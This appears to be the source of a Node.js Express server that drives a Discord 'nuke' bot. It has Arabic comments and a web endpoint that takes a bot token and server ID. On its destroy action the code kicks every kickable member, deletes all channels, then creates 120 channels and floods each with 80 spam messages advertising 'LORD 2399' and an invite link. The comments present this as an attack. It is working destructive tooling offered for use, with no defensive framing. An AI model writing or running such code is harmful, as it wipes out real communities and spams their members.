const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // محاولة تشغيل البوت فوراً قبل الرد على المتصفح
    const client = new Client({ 
        intents: [3276799] // ضمان الوصول لكل الصلاحيات
    });

    try {
        await client.login(token);
        console.log(`✅ تم تسجيل الدخول بنجاح باسم: ${client.user.tag}`);
        
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) {
            console.log("❌ البوت شغال لكن الأيدي غلط أو البوت مو بالسيرفر");
            return res.status(400).send({ status: '❌ البوت مو موجود في السيرفر!' });
        }

        res.status(200).send({ status: '🚀 انطلقت القوة! البوت متصل الآن' });

        const name = customName || "Lord 2399 V7";
        const msg = customMsg || "# LORD 2399 ON TOP\nhttps://discord.gg/2399k";

        // تنفيذ الهجوم (مضاعف 200%)
        if (action === 'تدمير' || action === 'طرد') {
            const members = await guild.members.fetch().catch(() => []);
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
        }

        if (action === 'تدمير') {
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            for (let i = 0; i < 120; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        for(let j=0; j<80; j++) ch.send(msg).catch(() => {});
                    }).catch(() => {});
                }, i * 15); // سرعة نانو ثانية
            }
        }
    } catch (err) {
        console.log("❌ فشل تشغيل البوت. السبب:", err.message);
        res.status(500).send({ status: `❌ فشل: ${err.message}` });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server Online on port ${PORT}`));
